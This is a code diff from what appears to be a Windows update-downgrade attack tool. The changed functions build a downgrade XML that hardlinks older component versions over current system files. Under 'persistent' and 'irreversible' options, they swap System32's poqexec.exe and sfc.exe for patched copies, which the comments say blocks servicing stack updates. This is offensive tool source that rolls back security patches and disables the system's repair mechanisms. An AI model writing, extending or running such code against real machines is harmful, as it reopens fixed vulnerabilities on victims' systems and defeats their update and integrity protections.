@@ -60,32 +60,19 @@ def parse_config_xml(config_file_path: str) -> List[UpdateFile]:
         destination_file = get_element_attribute(update_file, "destination")
         destination_file_obj = Path(destination_file)
 
-        # If the destination does not exist, we can not update it
-        if not is_path_exists(destination_file_obj.full_path):
-            raise FileNotFoundError(f"The file to update {destination_file_obj.full_path} does not exist")
-
         source_file = get_element_attribute(update_file, "source")
         source_file_obj = Path(source_file)
 
         # If the source does not exist, retrieve its oldest version from the component store
-        if not is_path_exists(source_file_obj.full_path):
+        if not source_file_obj.exists:
             should_retrieve_oldest = True
         else:
             should_retrieve_oldest = False
 
-        update_file_obj = UpdateFile(source_file_obj, destination_file_obj, should_retrieve_oldest, False)
+        update_file_obj = UpdateFile(source_file_obj, destination_file_obj, should_retrieve_oldest)
         update_files.append(update_file_obj)
 
     return update_files
-
-
-def create_non_sxs_update_file(source: str, destination: str) -> UpdateFile:
-    source_path_obj = Path(source)
-    if not is_path_exists(source_path_obj.full_path):
-        raise FileNotFoundError(f"Source non-sxs update file {source_path_obj.name} does not exist")
-
-    destination_path_obj = Path(destination)
-    return UpdateFile(source_path_obj, destination_path_obj, False, False)
 
 
 def craft_downgrade_xml(update_files: List[UpdateFile]) -> ET.ElementTree:
@@ -95,8 +82,9 @@ def craft_downgrade_xml(update_files: List[UpdateFile]) -> ET.ElementTree:
     for update_file in update_files:
 
         # Let's make sure we do not update files that are the same
-        if is_file_contents_equal(update_file.source.full_path, update_file.destination.full_path):
-            logger.info(f"Skipping update of {update_file.destination.name}, source and destination are the same")
+        if is_file_contents_equal(update_file.source_path_obj.full_path, update_file.destination_path_obj.full_path):
+            logger.info(f"Skipping update of {update_file.destination_path_obj.name},"
+                        f" source and destination are the same")
             continue
 
         hardlink_dict = update_file.to_hardlink_dict()
@@ -126,16 +114,16 @@ def main() -> None:
 
     # Add poqexec.exe patch to downgrade XML and block servicing stack updates
     if args.persistent:
-        patched_poqexec_path = f"{cwd}\\resources\\PoqExec\\poqexec.exe"
-        poqexec_path = "C:\\Windows\\System32\\poqexec.exe"
-        poqexec_update_file_obj = create_non_sxs_update_file(patched_poqexec_path, poqexec_path)
+        patched_poqexec_path_obj = Path(f"{cwd}\\resources\\PoqExec\\poqexec.exe")
+        poqexec_path_obj = Path("C:\\Windows\\System32\\poqexec.exe")
+        poqexec_update_file_obj = UpdateFile(patched_poqexec_path_obj, poqexec_path_obj)
         update_files.append(poqexec_update_file_obj)
 
     # Add SFC.exe patch to downgrade XML
     if args.irreversible:
-        patched_sfc_path = f"{cwd}\\resources\\SFC\\sfc.exe"
-        sfc_path = "C:\\Windows\\System32\\sfc.exe"
-        sfc_update_file_obj = create_non_sxs_update_file(patched_sfc_path, sfc_path)
+        patched_sfc_path_obj = Path(f"{cwd}\\resources\\SFC\\sfc.exe")
+        sfc_path_obj = Path("C:\\Windows\\System32\\sfc.exe")
+        sfc_update_file_obj = UpdateFile(patched_sfc_path_obj, sfc_path_obj)
         update_files.append(sfc_update_file_obj)
 
     retrieve_oldest_files_for_update_files(update_files)
